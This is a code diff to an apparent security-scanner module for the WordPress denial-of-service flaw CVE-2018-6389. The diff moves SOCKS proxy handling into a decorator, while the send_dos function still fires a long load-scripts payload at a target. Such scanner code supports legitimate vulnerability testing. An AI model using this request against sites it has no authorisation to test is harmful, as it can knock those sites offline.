@@ -25,6 +25,7 @@ from core._time import now
 from core.log import __log_into_file
 from core._die import __die_failure
 from lib.payload.wordlists import useragents
+from core.decor import socks_proxy
 
 def extra_requirements_dict():
     return {
@@ -33,7 +34,7 @@ def extra_requirements_dict():
         "wordpress_dos_cve_2018_6389_vuln_no_limit": ["False"],
     }
 
-
+@socks_proxy
 def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep, thread_tmp_filename, retries,
              socks_proxy, scan_id, scan_cmd):
     time.sleep(time_sleep)
@@ -70,29 +71,11 @@ def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep,
               "media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery," \
               "svg-painter&ver=4.9.1"
     try:
-        if socks_proxy is not None:
-            socks_version = socks.SOCKS5 if socks_proxy.startswith(
-                'socks5://') else socks.SOCKS4
-            socks_proxy = socks_proxy.rsplit('://')[1]
-            if '@' in socks_proxy:
-                socks_username = socks_proxy.rsplit(':')[0]
-                socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
-                socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
-                                        int(socks_proxy.rsplit(':')[-1]), username=socks_username,
-                                        password=socks_password)
-                socket.socket = socks.socksocket
-                socket.getaddrinfo = getaddrinfo
-            else:
-                socks.set_default_proxy(socks_version, str(
-                    socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
-                socket.socket = socks.socksocket
-                socket.getaddrinfo = getaddrinfo
         r = requests.get(target + payload, timeout=timeout_sec,
                          headers=user_agent).content
         return True
     except:
         return False
-
 
 def test(target, retries, timeout_sec, user_agent, socks_proxy, verbose_level, trying, total_req, total,
          num, language, dos_flag, log_in_file, scan_id, scan_cmd, thread_tmp_filename):
